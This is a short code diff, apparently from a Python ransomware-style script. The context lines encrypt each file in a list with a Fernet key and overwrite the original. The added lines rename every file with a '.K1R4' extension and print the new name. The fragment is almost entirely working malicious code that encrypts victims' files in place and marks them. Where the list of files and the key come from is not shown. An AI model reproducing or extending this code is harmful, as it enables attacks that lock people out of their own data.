@@ -46,3 +46,8 @@ for file in files:
     contents_encrypted=Fernet(key).encrypt(contents)
     with open (file, "wb") as thefile:
         thefile.write(contents_encrypted)
+ext=".K1R4"
+for file in files:
+    new_file=file+ext
+    os.rename(file, new_file)
+    print(new_file)
